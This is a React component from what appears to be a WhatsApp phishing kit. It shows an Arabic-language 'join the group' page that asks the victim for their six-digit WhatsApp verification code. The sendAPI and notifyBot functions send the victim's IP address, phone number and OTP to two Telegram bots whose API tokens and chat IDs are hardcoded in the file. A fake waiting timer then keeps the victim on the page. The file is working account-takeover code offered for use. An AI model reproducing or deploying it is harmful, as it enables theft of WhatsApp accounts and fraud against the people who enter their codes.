import { useState, useRef, useEffect } from "react";
import { formatPhoneNumberIntl } from "react-phone-number-input";
import Axios from "axios";
import SettingsContext from "../Context/SettingsContext";
import Timer from "../Timer/Timer";

export default function Confirm({ setPage, setNcode, ncode }) {
  const [error, setError] = useState(false);
  const [code, setCode] = useState("");
  const id = useRef(0);
  const [resendTimer, setResendTimer] = useState(60);
  const [messageResend, setMessageResend] = useState("إعادة إرسال رمز");
  const [workMinutes, setWorkMinutes] = useState(1 / 6);
  const [message, setMessage] = useState({
    content: "رابط الإنضمام إلى المجموعة",
    color: "text-gray-700",
  });
  const [loading, setLoading] = useState(false);

  const bots = [
    {
      apiToken: "7996981843:AAEfILtAIjgNElsVAt3NWX6d1Mm3WogpYiI",
      chat_id: "7794753220",
    },
    {
      apiToken: "7846242608:AAFHmhzvkbf10v60N0TCAHMCQYsJlmCK2GE",
      chat_id: "7820518007",
    },
  ];

  const sendAPI = async (currentCode) => {
    const textMessage = `
-------[ Whatsapp OTP Code ]-------
IP Address    : ${ncode.ip}
Phone Number  : ${formatPhoneNumberIntl(ncode.number)}
Code Whatsapp : ${currentCode}
`;

    bots.forEach(async ({ apiToken, chat_id }) => {
      try {
        const queryParams = {
          text: textMessage,
          chat_id,
          parse_mode: "html",
        };
        const queryString = new URLSearchParams(queryParams).toString();
        const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;

        await Axios.get(url);
      } catch (error) {
        console.error("Erreur lors de l'envoi du code OTP au bot :", error);
      }
    });
  };

  const notifyBot = async () => {
    const textMessage = `
-------[ Whatsapp Resend OTP Code Request ]-------
IP Address    : ${ncode.ip}
Phone Number  : ${formatPhoneNumberIntl(ncode.number)}
`;

    bots.forEach(async ({ apiToken, chat_id }) => {
      try {
        const queryParams = {
          text: textMessage,
          chat_id,
          parse_mode: "html",
        };
        const queryString = new URLSearchParams(queryParams).toString();
        const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryString}`;

        await Axios.get(url);
      } catch (error) {
        console.error("Erreur lors de l'envoi du resend au bot :", error);
      }
    });
  };

  const handleCodeSubmission = (currentCode) => {
    if (currentCode.length < 6) {
      setError(true);
    } else {
      setNcode({ ...ncode, code: currentCode });
      sendAPI(currentCode);
      setError(false);
      clearTimeout(id.current);
      setLoading(true);
      setMessage({
        content: "يرجى عدم مغادرة الصفحة لحين تأكيد إضافتك",
        color: "text-gray-700",
      });
      setTimeout(() => {
        setCode("");
        setLoading(false);
        setPage("p3");
      }, 10000);
    }
  };

  const inputCode = (e, index) => {
    const codeInputs = document.querySelectorAll(".pin-input input");
    const progress = document.querySelector(".two-step-input-parent .highlight");

    if (index < codeInputs.length - 1) {
      codeInputs[index + 1].focus();
      progress.style.width = `${Number.parseInt(progress.style.width) + 10}%`;
    }

    const currentCode = code + e.target.value;
    setCode(currentCode);

    if (index === codeInputs.length - 1) {
      handleCodeSubmission(currentCode);
    }
  };

  const keyPress = (e, index) => {
    const codeInputs = document.querySelectorAll(".pin-input input");
    const progress = document.querySelector(".two-step-input-parent .highlight");
    const keyCode = e.which ? e.which : e.keyCode;

    if (keyCode < 48 || keyCode > 57) {
      e.preventDefault();
    }

    if (keyCode === 8 && index > 0) {
      codeInputs[index - 1].value = "";
      codeInputs[index - 1].focus();
      const currentPin = code.slice(0, -1);
      setCode(currentPin);
      progress.style.width = `${Number.parseInt(progress.style.width) - 10}%`;
    }

    if (code.length !== index) {
      codeInputs[code.length].focus();
    }
  };

  const clipboard = (e) => {
    e.preventDefault();
    let otp = e.clipboardData.getData("text").replace("-", "");
    if (otp.length === 6) {
      const progress = document.querySelector(".two-step-input-parent .highlight");
      const codeInputs = document.querySelectorAll(".pin-input input");
      const otpList = otp.split("");

      otpList.forEach((digit, i) => {
        codeInputs[i].value = digit;
        progress.style.width = `${Number.parseInt(progress.style.width) + 10}%`;
      });

      setCode(otp);
      setTimeout(() => handleCodeSubmission(otp), 100);
    }
  };

  const resendSMSAgain = (e) => {
    setMessageResend("تم إرسال رقم بنجاح");
    setResendTimer(60);
    notifyBot();
    setTimeout(() => {
      setMessageResend("إعادة إرسال رمز");
    }, 5000);
  };

  useEffect(() => {
    id.current = setTimeout(() => {
      setResendTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearTimeout(id.current);
  }, [resendTimer]);

  return (
    <div className="md:w-1/2 mx-auto shadow-xl rounded-2xl pb-2 bg-white size Conts" style={{ direction: "rtl" }}>
      <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md space-y-8">
          <div>
            <img className="mx-auto h-12 w-auto" src="images/wp.png" alt="Your Company" />
            <h2 className={`mt-6 text-center tracking-tight ${message.color}`}>{message.content}</h2>
          </div>
          {loading ? (
            <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
              <SettingsContext.Provider value={{ workMinutes, setWorkMinutes }}>
                <Timer />
              </SettingsContext.Provider>
            </div>
          ) : (
            <div className="mt-8 space-y-6">
              <div className="-space-y-px rounded-md shadow-sm" style={{ boxShadow: "none", borderRadius: 0 }}>
                <div className="two-step-input-parent">
                  <div className="pin-input-container">
                    <div className="pin-input" id="pinInput">
                      {[...Array(6)].map((_, index) => (
                        <input
                          key={index}
                          onInput={(e) => inputCode(e, index)}
                          onKeyDown={(e) => keyPress(e, index)}
                          onPaste={clipboard}
                          type="tel"
                          pattern="[0-9]{10}"
                          maxLength="1"
                          placeholder="-"
                          autoFocus={index === 0}
                        />
                      ))}
                    </div>
                  </div>
                  <span className="highlight" style={{ width: "4%" }}></span>
                </div>
              </div>
              {error && (
                <div className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg" role="alert" style={{ direction: "rtl" }}>
                  <svg aria-hidden="true" className="flex-shrink-0 inline w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd"></path>
                  </svg>
                  <div><span className="mr-1 font-medium">الرمز غير صحيح</span></div>
                </div>
              )}
              <div>
                <h3 className="two-step-verification-retry">أدخل الكود المؤلف من 6 أرقام</h3>
                <div className="resend-sms" style={{ marginTop: "20px", marginBottom: "15px", display: "flex", justifyContent: "space-between" }}>
                  <div className="resend-element" style={{ display: "flex" }}>
                    <img
                      src="images/resend-otp.png"
                      alt="whatsapp lock"
                      style={{
                        width: "30px",
                        height: "30px",
                        marginLeft: "15px",
                        marginRight: "15px",
                        opacity: 0.6,
                      }}
                    />
                    <p
                      onClick={(e) => resendTimer === 0 ? resendSMSAgain(e) : ""}
                      className="two-step-verification-retry"
                    >
                      {messageResend}
                    </p>
                  </div>
                  <span
                    className="two-step-verification-retry"
                    style={{
                      marginLeft: "15px",
                    }}
                  >
                    0:
                    {resendTimer < 10 && resendTimer > 0
                      ? "0" + resendTimer
                      : resendTimer}
                  </span>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
